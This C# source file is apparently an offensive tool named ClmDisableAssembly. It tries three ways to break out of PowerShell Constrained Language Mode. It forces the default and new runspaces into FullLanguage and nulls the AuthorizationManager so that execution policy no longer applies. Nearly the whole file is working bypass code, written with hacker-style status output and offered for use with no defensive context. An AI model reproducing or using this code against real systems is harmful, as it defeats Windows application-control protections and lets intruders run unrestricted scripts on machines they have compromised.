using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace ClmDisableAssembly
{
    public class ClmDisableAssembly
    {
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern int GetCurrentThreadId();

        public static int Start(string arg)
        {
            Console.WriteLine("[+] Managed mode assembly. Disabling CLM globally.");
            Console.WriteLine("\tCurrent thread ID (managed/unmanaged): " + System.Threading.Thread.CurrentThread.ManagedThreadId.ToString() + " / " + GetCurrentThreadId().ToString());
          
            if (arg.Length > 0)
            {
                Console.WriteLine($"\tPassed argument: '{arg}'");
            }

            // Switches back to FullLanguage in CLM
            Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;

            try
            {
                Runspace.DefaultRunspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;

                // Bypasses PowerShell execution policy
                Runspace.DefaultRunspace.InitialSessionState.AuthorizationManager = null;
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Approach #1 failed: " + e);
            }

            try
            {
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.ApartmentState = System.Threading.ApartmentState.STA;
                runspace.ThreadOptions = PSThreadOptions.UseCurrentThread;
                runspace.Open();
                runspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                runspace.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Approach #2 failed: " + e);
            }

            try
            {
                InitialSessionState initialSessionState = InitialSessionState.CreateDefault();
                initialSessionState.ApartmentState = System.Threading.ApartmentState.STA;
                initialSessionState.AuthorizationManager = null;
                initialSessionState.ThreadOptions = PSThreadOptions.UseCurrentThread;
                
                using (Runspace runspace = RunspaceFactory.CreateRunspace(initialSessionState))
                {
                    runspace.Open();
                    runspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                    runspace.InitialSessionState.AuthorizationManager = null;
                    runspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;
                    runspace.Close();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] Approach #3 failed: " + e);
            }

            return 0;
        }
    }
}
